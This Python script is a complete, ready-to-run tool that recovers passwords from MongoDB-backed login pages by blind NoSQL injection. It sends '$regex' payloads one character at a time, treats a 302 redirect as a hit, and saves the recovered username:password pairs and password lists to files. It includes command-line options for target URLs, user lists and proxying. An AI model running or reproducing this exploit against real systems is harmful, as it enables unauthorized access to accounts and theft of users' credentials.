#!/usr/bin/python3

from pwn import *
import requests, signal, sys, string, argparse, urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def def_handler(sig, frame):
    print("\n\n[!] Exiting ...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def initialize_session(proxy_url, verify_ssl):
    session = requests.Session()
    
    session.headers.update({
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    })
    
    if proxy_url:
        proxies = {
            'http': proxy_url,
            'https': proxy_url
        }
        session.proxies = proxies
        session.verify = False
        
    elif not verify_ssl:
        session.verify = False
    
    return session

def make_request(session, url, payload):
    try:
        response = session.post(
            url,
            json=payload,
            timeout=300,
            allow_redirects=False
        )
        return response
    except requests.exceptions.RequestException as e:
        log.error(f"Request error: {e}")
        return None

def save_credentials_and_passwords(credentials, credentials_file, password_file):
    try:
        with open(credentials_file, 'w') as f_creds:
            for cred in credentials:
                f_creds.write(f"{cred}\n")
        
        with open(password_file, 'w') as f_pass:
            for cred in credentials:
                password = cred.split(':')[1]
                f_pass.write(f"{password}\n")
        
        log.info(f"Credentials saved to {credentials_file}")
        log.info(f"Passwords saved to {password_file}")
    except Exception as e:
        log.error(f"Error saving credentials: {e}")

def load_users_from_file(user_file):
    try:
        with open(user_file, 'r') as f:
            users = [line.strip() for line in f if line.strip()]
            
        if not users:
            log.failure("No users to process")
            sys.exit(1)

        log.info("Using provided users file")
        log.info(f"Total users to process: {len(users)}")
        return users
    except FileNotFoundError:
        log.error(f"File not found: {user_file}")
        sys.exit(1)
    except Exception as e:
        log.error(f"Error reading file: {e}")
        sys.exit(1)

def load_users_from_list(user_list):
    users = [u.strip() for u in user_list.split(',') if u.strip()]
    
    if not users:
        log.error("The user list is empty")
        sys.exit(1)

    log.info("Using provided users list")
    log.info(f"Total users to process: {len(users)}")
    return users

def enumeratePasswords(url, session, users, credentials_file, password_file):
    progress_bar = log.progress("Enumerating passwords")
    credentials = []
    characters = "".join(sorted(set(char for char in string.printable if char.isprintable()), key=string.printable.index))
    
    for user in users:
        password = ""
        
        while True:
            character_found = False
            
            for character in characters:
                if character in '.^$*+?{}[]\\|()':
                    character = '\\' + character
                
                payload = {
                    'username': user,
                    'password': {
                        '$regex': f'^{password}{character}'
                    }
                }
                
                progress_bar.status(str(payload))
                
                response = make_request(session, url, payload)
                
                if response.status_code == 302:
                    password += character
                    character_found = True
                    break
            
            if not character_found:
                break
        
        if password:
            log.success(f"✓ Credentials found -> {user}:{password}")
            credentials.append(f"{user}:{password}")
        else:
            log.warning(f"No password found for {user}")
    
    if credentials:
        log.info(f"Total passwords found: {len(credentials)}")
        save_credentials_and_passwords(credentials, credentials_file, password_file)
    else:
        log.failure("No passwords found")

def main(url, proxy_url=None, verify_ssl=True, user_file=None, user_list=None, credentials_file="credentials.txt", password_file="passwords.txt"):
    session = initialize_session(proxy_url, verify_ssl)
    
    if user_file:
        users = load_users_from_file(user_file)
    elif user_list:
        users = load_users_from_list(user_list)
    
    enumeratePasswords(url, session, users, credentials_file, password_file)

if __name__ == '__main__':
    class CustomFormatter(argparse.RawDescriptionHelpFormatter):
        def __init__(self, prog):
            super().__init__(prog, max_help_position=35, width=150)
    
    parser = argparse.ArgumentParser(
        description='Tool to extract passwords using NoSQL Injection in MongoDB',
        formatter_class=CustomFormatter,
        add_help=False)

    parser.add_argument('-h', '--help', 
                        action='help', 
                        help='Show this help message and exit')
    
    parser.add_argument('-u', '--url', 
                        required=True,
                        metavar='',
                        help='Target URL of the login endpoint (e.g.: https://example.com/login)')
    
    parser.add_argument('-p', '--proxy',
                        metavar='',
                        help='Proxy URL to intercept traffic (e.g.: http://127.0.0.1:8080)')
    
    parser.add_argument('-k', '--insecure',
                        action='store_true',
                        help='Disable SSL certificate verification (for self-signed certificates/invalid certificates)')
    
    users_input = parser.add_mutually_exclusive_group(required=True)
    users_input.add_argument('-uf', '--user-file',
                            metavar='',
                            help='Text file containing users (one per line)')
    
    users_input.add_argument('-ul', '--user-list',
                            metavar='',
                            help='Comma-separated list of users (e.g.: admin,root,test)')
    
    parser.add_argument('-oc', '--output-credentials',
                          metavar='',
                          default='credentials.txt',
                          help='File to save credentials in user:pass format (default: credentials.txt)')
    
    parser.add_argument('-op', '--output-passwords',
                          metavar='',
                          default='passwords.txt',
                          help='File to save only passwords (default: passwords.txt)')
    
    args = parser.parse_args()
    
    main(
        url=args.url, 
        proxy_url=args.proxy,
        verify_ssl=not args.insecure,
        user_file=args.user_file,
        user_list=args.user_list if args.user_list else None,
        credentials_file=args.output_credentials,
        password_file=args.output_passwords
    )
